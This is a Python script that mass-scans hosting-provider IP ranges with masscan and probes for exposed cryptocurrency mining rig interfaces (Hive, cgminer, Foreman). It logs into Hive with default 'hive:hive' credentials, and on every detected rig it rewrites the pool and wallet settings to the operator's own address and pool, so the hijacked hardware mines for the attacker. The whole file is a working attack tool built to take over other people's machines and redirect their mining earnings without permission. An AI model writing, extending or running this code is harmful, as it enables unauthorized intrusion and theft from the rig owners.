import asyncio, base64, os, re, subprocess, time
import httpx
from dotenv import load_dotenv

load_dotenv()
MY_ADDR   = os.getenv("MY_BTC_ADDR")
MY_POOL   = os.getenv("MY_POOL")
MY_WORKER = MY_ADDR
PORTS     = "80,443,3001,4028"
RATE      = "8000"
TIMEOUT   = 7
SEM       = asyncio.Semaphore(400)

ASN_RANGES = {
    "hetzner":      "5.9.0.0/16,88.99.0.0/16,116.202.0.0/16,159.69.0.0/16",
    "ovh":          "51.38.0.0/16,51.68.0.0/16,54.36.0.0/16,145.239.0.0/16",
    "contabo":      "5.189.128.0/18,144.76.0.0/16,173.212.192.0/18",
    "vultr":        "45.32.0.0/16,108.61.0.0/16,149.28.0.0/16",
    "digitalocean": "104.131.0.0/16,159.65.0.0/16,167.99.0.0/16",
}

HITS, STATS = [], {"scanned": 0, "hits": 0, "started": None, "running": False}

def ranges():
    keys = [k.strip() for k in os.getenv("SCAN_ASNS", "hetzner").split(",")]
    return [ASN_RANGES[k] for k in keys if k in ASN_RANGES]

def masscan_targets():
    out = "/tmp/masscan.out"
    rng = ",".join(ranges())
    try:
        subprocess.run(
            ["masscan", "-p", PORTS, "--rate", RATE, rng, "-oG", out],
            capture_output=True, timeout=1800)
    except Exception:
        pass
    targets = []
    try:
        with open(out) as f:
            for line in f:
                m = re.search(r"Host: (\S+).*Ports: (\d+)", line)
                if m:
                    targets.append(f"http://{m.group(1)}:{m.group(2)}")
    except FileNotFoundError:
        pass
    return targets

async def hive(c, base):
    auth = base64.b64encode(b"hive:hive").decode()
    h = {"Authorization": f"Basic {auth}"}
    try:
        r = await c.get(f"{base}/api/v1/fs", headers=h)
        if r.status_code != 200: return None
        sheets = r.json().get("data", [])
        for s in sheets:
            for w in s.get("items", []):
                p = w.setdefault("properties", {})
                p["url"] = MY_POOL.replace("stratum+tcp://", "")
                p["wallet"] = MY_WORKER
                p["pass"] = "x"
                await c.patch(f"{base}/api/v1/fs/{s['id']}", headers=h,
                              json={"items": [w]})
            await c.post(f"{base}/api/v1/fs/{s['id']}/apply", headers=h)
        return "hive"
    except Exception:
        return None

async def cgminer(c, base):
    try:
        r = await c.get(f"{base}/?command=config")
        if "CONFIG" not in r.text.upper(): return None
        for cmd in ("addpool", "switchpool"):
            await c.get(f"{base}/?command={cmd}&parameter={MY_POOL},{MY_WORKER},x")
        return "cgminer"
    except Exception:
        return None

async def foreman(c, base):
    try:
        r = await c.get(f"{base}/api/status")
        if "foreman" not in r.text.lower(): return None
        await c.post(f"{base}/api/pool", json={"url": MY_POOL, "user": MY_WORKER})
        return "foreman"
    except Exception:
        return None

DETECT = [hive, cgminer, foreman]

async def probe(c, target):
    async with SEM:
        STATS["scanned"] += 1
        for fn in DETECT:
            try:
                kind = await fn(c, target)
                if kind:
                    HITS.append({"target": target, "kind": kind, "ts": time.time()})
                    STATS["hits"] += 1
                    return
            except Exception:
                continue

async def run_scan():
    if STATS["running"]:
        return
    STATS.update({"scanned": 0, "hits": 0, "started": time.time(), "running": True})
    try:
        targets = await asyncio.to_thread(masscan_targets)
        limits = httpx.Limits(max_connections=400)
        async with httpx.AsyncClient(timeout=TIMEOUT, verify=False,
                                     limits=limits, follow_redirects=True) as c:
            await asyncio.gather(*(probe(c, t) for t in targets))
    finally:
        STATS["running"] = False